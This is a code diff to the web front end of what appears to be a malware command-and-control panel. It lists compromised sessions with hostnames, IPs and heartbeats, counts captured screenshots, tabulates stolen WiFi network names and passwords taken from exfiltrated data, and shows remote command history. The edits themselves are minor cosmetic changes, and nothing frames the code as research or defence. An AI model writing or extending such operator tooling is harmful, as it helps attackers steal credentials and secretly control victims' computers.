@@ -494,10 +494,11 @@
                     <div class="stat-card"><h3>${screenshots}</h3><p>Screenshots</p></div>
                 </div>
                 <div class="panel">
-                    <div class="panel-header">Active Sessions</div>
+                    <div class="panel-header">Active Sessions (with real status)</div>
                     <div class="panel-body-scroll">
                         <table><thead><tr><th>Session ID</th><th>Hostname/User</th><th>IP Address</th><th>Last Heartbeat</th><th>Status</th><th>Actions</th></tr></thead>
-                        <tbody id="overviewAgentsBody"></tbody></table>
+                        <tbody id="overviewAgentsBody"></tbody>
+                    </table>
                     </div>
                 </div>
                 <div class="panel">
@@ -620,7 +621,7 @@
                         rows.push(`<tr><td><code>${escapeHtml(wifi.sessionId?.substring(0, 8))}</code></td><td>${escapeHtml(net.ssid)}</td><td><code>${escapeHtml(net.password)}</code></td><td>${formatDate(wifi.timestamp)}</td></tr>`);
                     }
                 }
-                if (rows.length === 0) tbody.innerHTML = '<tr><td colspan="4">No WiFi data parsed.</td></tr>';
+                if (rows.length === 0) tbody.innerHTML = '<tr><td colspan="4">No WiFi data parsed. </td></tr>';
                 else tbody.innerHTML = rows.join('');
             }
         }
@@ -630,7 +631,7 @@
             const data = await fetchExfilData('command_result');
             document.getElementById('pageContent').innerHTML = `<div class="panel"><div class="panel-body-scroll"><table><thead><tr><th>Session</th><th>Command</th><th>Status</th><th>Result</th><th>Time</th></tr></thead><tbody id="commandsHistoryBody"></tbody></table></div></div>`;
             const tbody = document.getElementById('commandsHistoryBody');
-            if (data.length === 0) tbody.innerHTML = '<tr><td colspan="5">No command history.</td></tr>';
+            if (data.length === 0) tbody.innerHTML = '<tr><td colspan="5">No command history. </td></tr>';
             else {
                 tbody.innerHTML = data.slice(0, 100).map(cmd => `<tr>
                     <td><code>${escapeHtml(cmd.sessionId?.substring(0, 8))}</code></td>
